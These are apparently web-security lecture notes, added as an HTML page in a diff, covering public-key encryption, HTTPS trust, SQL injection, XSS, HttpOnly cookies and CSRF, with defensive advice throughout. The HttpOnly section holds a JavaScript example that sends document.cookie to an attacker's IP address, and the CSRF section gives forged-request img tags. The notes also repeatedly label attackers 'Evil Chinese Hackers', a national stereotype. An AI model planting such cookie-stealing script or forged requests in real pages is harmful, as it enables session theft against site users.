@@ -1,0 +1,615 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="generator" content="Docutils 0.4: http://docutils.sourceforge.net/" />
+<title>Programming for the Web Safely &amp; Securely</title>
+<style type="text/css">
+
+/*
+:Author: David Goodger
+:Contact: goodger@users.sourceforge.net
+:Date: $Date: 2005-12-18 01:56:14 +0100 (Sun, 18 Dec 2005) $
+:Revision: $Revision: 4224 $
+:Copyright: This stylesheet has been placed in the public domain.
+
+Default cascading style sheet for the HTML output of Docutils.
+
+See http://docutils.sf.net/docs/howto/html-stylesheets.html for how to
+customize this style sheet.
+*/
+
+/* used to remove borders from tables and images */
+.borderless, table.borderless td, table.borderless th {
+  border: 0 }
+
+table.borderless td, table.borderless th {
+  /* Override padding for "table.docutils td" with "! important".
+     The right padding separates the table cells. */
+  padding: 0 0.5em 0 0 ! important }
+
+.first {
+  /* Override more specific margin styles with "! important". */
+  margin-top: 0 ! important }
+
+.last, .with-subtitle {
+  margin-bottom: 0 ! important }
+
+.hidden {
+  display: none }
+
+a.toc-backref {
+  text-decoration: none ;
+  color: black }
+
+blockquote.epigraph {
+  margin: 2em 5em ; }
+
+dl.docutils dd {
+  margin-bottom: 0.5em }
+
+/* Uncomment (and remove this text!) to get bold-faced definition list terms
+dl.docutils dt {
+  font-weight: bold }
+*/
+
+div.abstract {
+  margin: 2em 5em }
+
+div.abstract p.topic-title {
+  font-weight: bold ;
+  text-align: center }
+
+div.admonition, div.attention, div.caution, div.danger, div.error,
+div.hint, div.important, div.note, div.tip, div.warning {
+  margin: 2em ;
+  border: medium outset ;
+  padding: 1em }
+
+div.admonition p.admonition-title, div.hint p.admonition-title,
+div.important p.admonition-title, div.note p.admonition-title,
+div.tip p.admonition-title {
+  font-weight: bold ;
+  font-family: sans-serif }
+
+div.attention p.admonition-title, div.caution p.admonition-title,
+div.danger p.admonition-title, div.error p.admonition-title,
+div.warning p.admonition-title {
+  color: red ;
+  font-weight: bold ;
+  font-family: sans-serif }
+
+/* Uncomment (and remove this text!) to get reduced vertical space in
+   compound paragraphs.
+div.compound .compound-first, div.compound .compound-middle {
+  margin-bottom: 0.5em }
+
+div.compound .compound-last, div.compound .compound-middle {
+  margin-top: 0.5em }
+*/
+
+div.dedication {
+  margin: 2em 5em ;
+  text-align: center ;
+  font-style: italic }
+
+div.dedication p.topic-title {
+  font-weight: bold ;
+  font-style: normal }
+
+div.figure {
+  margin-left: 2em ;
+  margin-right: 2em }
+
+div.footer, div.header {
+  clear: both;
+  font-size: smaller }
+
+div.line-block {
+  display: block ;
+  margin-top: 1em ;
+  margin-bottom: 1em }
+
+div.line-block div.line-block {
+  margin-top: 0 ;
+  margin-bottom: 0 ;
+  margin-left: 1.5em }
+
+div.sidebar {
+  margin-left: 1em ;
+  border: medium outset ;
+  padding: 1em ;
+  background-color: #ffffee ;
+  width: 40% ;
+  float: right ;
+  clear: right }
+
+div.sidebar p.rubric {
+  font-family: sans-serif ;
+  font-size: medium }
+
+div.system-messages {
+  margin: 5em }
+
+div.system-messages h1 {
+  color: red }
+
+div.system-message {
+  border: medium outset ;
+  padding: 1em }
+
+div.system-message p.system-message-title {
+  color: red ;
+  font-weight: bold }
+
+div.topic {
+  margin: 2em }
+
+h1.section-subtitle, h2.section-subtitle, h3.section-subtitle,
+h4.section-subtitle, h5.section-subtitle, h6.section-subtitle {
+  margin-top: 0.4em }
+
+h1.title {
+  text-align: center }
+
+h2.subtitle {
+  text-align: center }
+
+hr.docutils {
+  width: 75% }
+
+img.align-left {
+  clear: left }
+
+img.align-right {
+  clear: right }
+
+ol.simple, ul.simple {
+  margin-bottom: 1em }
+
+ol.arabic {
+  list-style: decimal }
+
+ol.loweralpha {
+  list-style: lower-alpha }
+
+ol.upperalpha {
+  list-style: upper-alpha }
+
+ol.lowerroman {
+  list-style: lower-roman }
+
+ol.upperroman {
+  list-style: upper-roman }
+
+p.attribution {
+  text-align: right ;
+  margin-left: 50% }
+
+p.caption {
+  font-style: italic }
+
+p.credits {
+  font-style: italic ;
+  font-size: smaller }
+
+p.label {
+  white-space: nowrap }
+
+p.rubric {
+  font-weight: bold ;
+  font-size: larger ;
+  color: maroon ;
+  text-align: center }
+
+p.sidebar-title {
+  font-family: sans-serif ;
+  font-weight: bold ;
+  font-size: larger }
+
+p.sidebar-subtitle {
+  font-family: sans-serif ;
+  font-weight: bold }
+
+p.topic-title {
+  font-weight: bold }
+
+pre.address {
+  margin-bottom: 0 ;
+  margin-top: 0 ;
+  font-family: serif ;
+  font-size: 100% }
+
+pre.literal-block, pre.doctest-block {
+  margin-left: 2em ;
+  margin-right: 2em ;
+  background-color: #eeeeee }
+
+span.classifier {
+  font-family: sans-serif ;
+  font-style: oblique }
+
+span.classifier-delimiter {
+  font-family: sans-serif ;
+  font-weight: bold }
+
+span.interpreted {
+  font-family: sans-serif }
+
+span.option {
+  white-space: nowrap }
+
+span.pre {
+  white-space: pre }
+
+span.problematic {
+  color: red }
+
+span.section-subtitle {
+  /* font-size relative to parent (h1..h6 element) */
+  font-size: 80% }
+
+table.citation {
+  border-left: solid 1px gray;
+  margin-left: 1px }
+
+table.docinfo {
+  margin: 2em 4em }
+
+table.docutils {
+  margin-top: 0.5em ;
+  margin-bottom: 0.5em }
+
+table.footnote {
+  border-left: solid 1px black;
+  margin-left: 1px }
+
+table.docutils td, table.docutils th,
+table.docinfo td, table.docinfo th {
+  padding-left: 0.5em ;
+  padding-right: 0.5em ;
+  vertical-align: top }
+
+table.docutils th.field-name, table.docinfo th.docinfo-name {
+  font-weight: bold ;
+  text-align: left ;
+  white-space: nowrap ;
+  padding-left: 0 }
+
+h1 tt.docutils, h2 tt.docutils, h3 tt.docutils,
+h4 tt.docutils, h5 tt.docutils, h6 tt.docutils {
+  font-size: 100% }
+
+tt.docutils {
+  background-color: #eeeeee }
+
+ul.auto-toc {
+  list-style-type: none }
+
+</style>
+</head>
+<body>
+<div class="document" id="programming-for-the-web-safely-securely">
+<h1 class="title">Programming for the Web Safely &amp; Securely</h1>
+<p>So, this SQL query walks into a bar, goes up to two tables and says,
+&quot;Can I join you?&quot;</p>
+<hr class="docutils" />
+<p>Knock, knock.</p>
+<p>&quot;Who's there?&quot;</p>
+<p>very long pause...</p>
+<p>&quot;Java.&quot;</p>
+<hr class="docutils" />
+<p>&quot;All input is evil until proven otherwise.&quot;</p>
+<hr class="docutils" />
+<img alt="voting_machines.png" src="voting_machines.png" style="width: 600px;" />
+<hr class="docutils" />
+<div class="section">
+<h1><a id="misc" name="misc">Misc</a></h1>
+<p>Essay.</p>
+<p>Final project.</p>
+<p>Pizza preferences?</p>
+</div>
+<div class="section">
+<h1><a id="digression-public-key-encryption" name="digression-public-key-encryption">Digression: Public Key Encryption</a></h1>
+<p>Public-key encryption is based on a fundamental algorithmic asymmetry:
+<em>factoring</em> numbers into their prime components is harder than
+<em>multiplying</em> two numbers.</p>
+<p>For example, this number is the product of two primes:</p>
+<blockquote>
+Z= 12666337</blockquote>
+<p>What are the two factors?</p>
+<p>(X= 3571 and Y= 3547)</p>
+<p>How easy is it to calculate the prime factors?</p>
+<p>vs</p>
+<p>How easy is it to <em>verify</em> that those are the factors?</p>
+<p>So: design an algorithm to encrypt text with a number Z such that any
+text so encrypted can be easily decrypted with knowledge of the
+factorization of Z, i.e. the set of numbers X, Y, ... used to
+calculate Z.</p>
+<p>(See RSA algorithm for a detailed example (RSA == Rivest, Shamir, Adleman)).</p>
+<p>Now make Z publicly available: that is your public key.  Keep X and
+Y hidden.  Anyone who encrypts a message with Z using the algorithm
+can send that message to you secure in the knowledge that only someone
+knowledge of X and Y can decrypt it.</p>
+<div class="section">
+<h2><a id="signing-and-trust-chains" name="signing-and-trust-chains">Signing and trust chains</a></h2>
+<p>Want to identify <em>sender</em>.  Take advantage of fact that decryption is a
+privileged task, while encryption is not.</p>
+<p>Alice: hash message using private key =&gt; pass through decryption mechanism.
+This is the &quot;signature&quot; of the message.</p>
+<p>Bob: <em>encrypts</em> signature using Alice's public key, verifies that it
+equals the hash.  Only someone with the decryption key could have
+produced that signature, ergo, Alice produced the signature.</p>
+<p>Can extend this in a chain, where Alice signs Bobs public key, and Bob
+signs Chris's public key, so that anyone who trusts Alice can verify
+that she knows Bob and that Bob knows Chris.</p>
+</div>
+<div class="section">
+<h2><a id="software" name="software">Software</a></h2>
+<p>See PGP and GPG for software that does all of this...</p>
+</div>
+</div>
+<div class="section">
+<h1><a id="security" name="security">Security</a></h1>
+<p>Paranoia is not just a state of mind, it's a way of life.</p>
+<div class="section">
+<h2><a id="an-excellent-example" name="an-excellent-example">An excellent example</a></h2>
+<p>&quot;MiG in the middle&quot; story.</p>
+<p>Within this framework: can you swap out the pilot or the co-pilot, or
+can a passenger communicate via the plane's comm system (i.e. subvert
+the plane)?</p>
+<p>Compromising the endpoints OR compromising the middle...</p>
+</div>
+<div class="section">
+<h2><a id="goals" name="goals">Goals</a></h2>
+<ol class="arabic simple">
+<li>(Client) Communicate with specific server.</li>
+<li>(Server) Identify user while protecting against <em>systematic</em> user compromise.</li>
+<li>(Client &amp; server) Communicate <em>securely</em> (no eavesdropping)</li>
+<li>(Server) Handle a lot of users.</li>
+</ol>
+<p>Note that &quot;client&quot; cannot be trusted here: could be Evil Chinese Hacker,
+_or_ could simply be genuine malicious user.  The difference is not
+significant for a site!</p>
+<p>Will talk mostly about protocol- and browser-level attacks; network
+infrastructure attacks are also likely but outside our scope!</p>
+</div>
+<div class="section">
+<h2><a id="problems" name="problems">Problems</a></h2>
+<p>Statelessness - every connection &quot;starts fresh&quot;, so can't use single
+authentication.  Must communicate data... but is that data secure?</p>
+<p>How do you identify a Web site securely, anyway??</p>
+<p>And then there's eavesdropping.</p>
+<p>So, the parameters of the problem are:</p>
+<blockquote>
+<ul class="simple">
+<li>must identify server</li>
+<li>must protect data in browser from being sent to wrong server</li>
+<li>must protect communications from eavesdroppers</li>
+<li>server must protect against client-altered data, e.g. changed username</li>
+</ul>
+</blockquote>
+</div>
+<div class="section">
+<h2><a id="technologies" name="technologies">Technologies</a></h2>
+<p>Establishing a connection to the right host - DNS, server certificates</p>
+<p>Communicating securely with the host - HTTPS</p>
+<p>Establishing user identity - authentication</p>
+<p>Statelessness - URLs, cookies, and forms</p>
+<p>Preventing large-scale compromise - session IDs and hashing</p>
+</div>
+<div class="section">
+<h2><a id="factor-authentication-vs-2-way-authentication" name="factor-authentication-vs-2-way-authentication">2-factor authentication vs 2-way authentication</a></h2>
+<p>2-factor authentication (password + favorite color, for example) now mandated
+for banks!</p>
+<p>But... this simply helps the <em>bank</em> identify <em>you</em>.</p>
+<p>2-way authentication w/bank Web sites <em>depends</em> upon DNS and HTTPS server
+certificates!</p>
+</div>
+<div class="section">
+<h2><a id="connection-oriented-security" name="connection-oriented-security">Connection-oriented security</a></h2>
+<p>Looking up Web sites (Domain Name Service, DNS)</p>
+<blockquote>
+<ul class="simple">
+<li>think of it as a phone book: name =&gt; number.</li>
+<li>but a phone book with a hierarchical distrib scheme: master servers
+dynamically updated DNS.</li>
+<li>fairly insecure: your ISP usually gives you the name servers to use
+via DHCP, and you have no guarantee that they are correct or
+untampered with.</li>
+</ul>
+</blockquote>
+<p>Connecting safely to Web sites (HTTPS and server-side certificates)</p>
+<blockquote>
+<ul class="simple">
+<li>S == &quot;Secure Socket Layer&quot;</li>
+<li>end-to-end encryption based on key pairs</li>
+</ul>
+</blockquote>
+<p>How do you know you're talking to the right site??</p>
+<blockquote>
+<ul class="simple">
+<li>digitally-signed certificates: &quot;this site at xxx.yyy.zzz possesses
+a private certificate, signed by BigCentralAuthority&quot;, that identifies
+them as the genuine xxx.yyy.zzz site.&quot;</li>
+<li>umm, how do you know it's xxx.yyy.zzz, anyway?  DNS told you...</li>
+<li>certificates must be hard to forge.</li>
+<li>you must trust BigCentralAuthority to not issue multiple certificates.</li>
+<li>end-to-end makes it proof against man-in-the-middle attacks.</li>
+</ul>
+</blockquote>
+<p>Note: BigCentralAuthority can delegate other sites to issue certificates,
+too, using a chain of trust.</p>
+</div>
+<div class="section">
+<h2><a id="social-engineering-or-compromising-the-user" name="social-engineering-or-compromising-the-user">Social engineering, or &quot;compromising the user&quot;</a></h2>
+<p>A sucker is born every minute!</p>
+<p>&quot;Hello, we are the support desk for YourBigBank.  What is your username
+and password so that we can verify your account information?&quot;</p>
+<p>Mangled or confusing or internationalized URLs:</p>
+<blockquote>
+<a class="reference" href="http://www.yourbank.example.com/">http://www.yourbank.example.com/</a>
+<a class="reference" href="http://www.google.com&#64;members.tripod.com/">http://www.google.com&#64;members.tripod.com/</a></blockquote>
+<p>Also e.g. 0/O and l/1, but with internationalization.</p>
+</div>
+<div class="section">
+<h2><a id="denial-of-service-dos" name="denial-of-service-dos">Denial of Service (DoS)</a></h2>
+<p>&quot;Here's a 1gb file.&quot;</p>
+<p>&quot;Here's another 500 of them.  Tasty?&quot;</p>
+<p>Can saturate:</p>
+<blockquote>
+<ul class="simple">
+<li>connections</li>
+<li>bandwidth</li>
+<li>disk space and RAM</li>
+<li>concurrent connection handling</li>
+</ul>
+</blockquote>
+<p>In some cases (connection, bandwidth) you must protect &#64; network level.</p>
+<p>In other cases (disk space, concurrent connection handling) can regulate
+within the server.</p>
+<p>Most Web servers do not do this well!  Specialized mechanisms exist for
+filtering and proxying.</p>
+</div>
+<div class="section">
+<h2><a id="buffer-overruns" name="buffer-overruns">Buffer overruns</a></h2>
+<p>Server uses a fixed-width buffer of size N; client sends N+ data; remaining
+data sent overwrites (eventually) server code =&gt; client can run arbitrary
+code on server.</p>
+<p>In the days of C server code, this was a very common attack:</p>
+<pre class="literal-block">
+char buf[256];
+recv(buf, amount);
+</pre>
+<p>What if 'amount' is negative, or not properly calculated? =&gt; buf overflow.</p>
+<p>Bleah.</p>
+<p>Now most new networking code is written in something other than C; better
+languages (e.g. Python ;) dynamically allocate buffers.</p>
+<p>...but think about the denial of service aspect: perhaps the C route is
+better, because it won't dynamically allocate 1gb of RAM to receive!</p>
+</div>
+<div class="section">
+<h2><a id="sql-injection" name="sql-injection">SQL injection</a></h2>
+<p>SQL databases are very common esp at big companies, so specific attacks
+against them have been designed.</p>
+<img alt="exploits_of_a_mom.png" src="exploits_of_a_mom.png" style="width: 600px;" />
+<p>Malformed quoting or other &quot;games&quot; with usernames, input values, etc.</p>
+<p>That's why you <em>always</em> use placeholders, like '?', in your SQL queries
+from Python: your SQL interface library handles the quoting.</p>
+</div>
+<div class="section">
+<h2><a id="xss-cross-site-scripting" name="xss-cross-site-scripting">XSS: Cross-Site Scripting</a></h2>
+<p>(a.k.a. &quot;HTML injection&quot;)</p>
+<p>If attackers can inject arbitrary HTML into your browser, including
+HTML containing valid JavaScript, then attackers can control your
+browser.</p>
+<p>For example, unquoted posts in message boards or error message display
+allow you to &quot;take over&quot; a browser.</p>
+<p>Works within &quot;same-origin&quot; policy sandbox: JavaScript originates from same site
+that sent pages &amp; cookies, so the JS can load pages, manipulate cookies,
+etc.</p>
+</div>
+<div class="section">
+<h2><a id="xss-and-httponly-protecting-the-cookie-jar" name="xss-and-httponly-protecting-the-cookie-jar">XSS and HttpOnly: Protecting the Cookie Jar</a></h2>
+<p>Can mark your cookies as inaccessible to JavaScript with HttpOnly:</p>
+<pre class="literal-block">
+Set-Cookie: ASP.NET_SessionId=ig2fac55; path=/; HttpOnly
+</pre>
+<p>This protects against a specific class of attacks that sends your
+cookies to another URL with a JS redirect:</p>
+<pre class="literal-block">
+window.location=&quot;http://1.2.3.4:81/r.php?u=&quot;
++document.links[1].text
++&quot;&amp;l=&quot;+document.links[1]
++&quot;&amp;c=&quot;+document.cookie;
+</pre>
+<p>Browser support is still spotty (e.g. FF doesn't entirely work).</p>
+<p>Only protects against a particularly <em>easy</em> set of XSS attacks...</p>
+</div>
+<div class="section">
+<h2><a id="xsrf-cross-site-request-forgeries" name="xsrf-cross-site-request-forgeries">XSRF: Cross-Site Request Forgeries</a></h2>
+<blockquote>
+<p>CSRF vulnerabilities occur when a website allows an authenticated
+user to perform a sensitive action but does not verify that the
+user herself is invoking that action. The key to understanding CSRF
+attacks is to recognize that websites typically don't verify that a
+request came from an authorized user. Instead they verify only that
+the request came from the browser of an authorized user. Because
+browsers run code sent by multiple sites, there is a danger that
+one site will (unbeknownst to the user) send a request to a second
+site, and the second site will mistakenly think that the user
+authorized the request.</p>
+<blockquote>
+-- Bill Zeller</blockquote>
+</blockquote>
+<p>Take advantage of stateful mechanisms in browsers designed to help
+&quot;chain&quot; multiple requests.</p>
+<p>Simple example:</p>
+<pre class="literal-block">
+&lt;img src=&quot;http://foo.com/logout&quot;&gt;
+</pre>
+<p>That image URL is loaded with full browser credentials!  So now you've
+logged the person out of the site.  Annoying -- now imagine</p>
+<blockquote>
+&lt;img src=&quot;<a class="reference" href="http://foobank.com/transfer_money">http://foobank.com/transfer_money</a>?src_account=checking&amp;...&quot;&gt;</blockquote>
+<p>Attack model:</p>
+<blockquote>
+<ul class="simple">
+<li>you're logged into your bank in one tab/window, or have a login cookie</li>
+<li>you go to another site run by the Evil Chinese Hackers</li>
+<li>ECH site builds a URL (either within a form or with JavaScript)
+confirming a bank transfer into ECH's bank account (or an e-bay
+purchase, or a paypal transaction...)</li>
+<li>ECH site gives you this URL to load (with JS, image link, etc.)</li>
+</ul>
+</blockquote>
+<p>With JS or image URLs or ..., you may not even know that the attack is
+taking place!</p>
+<p>Why does this vulnerability exist?  Chaining forms, for example.</p>
+<p>Protection mechanisms:</p>
+<blockquote>
+<ul class="simple">
+<li>check HTTP referrer (which can break for other reasons).</li>
+<li>Secret, hidden, dynamically generated form value on all your forms.</li>
+<li>Inject your site cookies into your forms with JavaScript, and then
+compare browser cookies with form values received.  This ensures that
+the author of the forms had direct access to the cookie information.</li>
+</ul>
+</blockquote>
+</div>
+</div>
+<div class="section">
+<h1><a id="two-principles-for-thinking-securely-about-security" name="two-principles-for-thinking-securely-about-security">Two principles for thinking securely about security</a></h1>
+<blockquote>
+<ol class="arabic simple">
+<li>Do you follow the rule that all input is evil until proven otherwise?</li>
+<li>Can you detect a man-in-the-middle attack?</li>
+</ol>
+</blockquote>
+<p>#1 is up to you.</p>
+<p>#2 is architectural: the Web is vulnerable to certain
+man-in-the-middle attacks, but if you use HTTPS you're probably as
+good as most banks.</p>
+<p>Either way, remember: the devil is in the details.  KISS so that at least
+flaws will be obvious to everyone!</p>
+</div>
+<div class="section">
+<h1><a id="references" name="references">References</a></h1>
+<p>MiG-in-the-middle attack - use Google.</p>
+<p>RSA encryption algorithm:</p>
+<blockquote>
+<a class="reference" href="http://en.wikipedia.org/wiki/RSA">http://en.wikipedia.org/wiki/RSA</a></blockquote>
+<p>Cross-site scripting:</p>
+<blockquote>
+<a class="reference" href="http://en.wikipedia.org/wiki/Cross-site_scripting">http://en.wikipedia.org/wiki/Cross-site_scripting</a></blockquote>
+<p>Cross-Site Request Forgeries and You:</p>
+<blockquote>
+<a class="reference" href="http://www.codinghorror.com/blog/archives/001171.html">http://www.codinghorror.com/blog/archives/001171.html</a></blockquote>
+<p>HttpOnly cookies:</p>
+<blockquote>
+<a class="reference" href="http://www.codinghorror.com/blog/archives/001167.html">http://www.codinghorror.com/blog/archives/001167.html</a></blockquote>
+</div>
+</div>
+</body>
+</html>
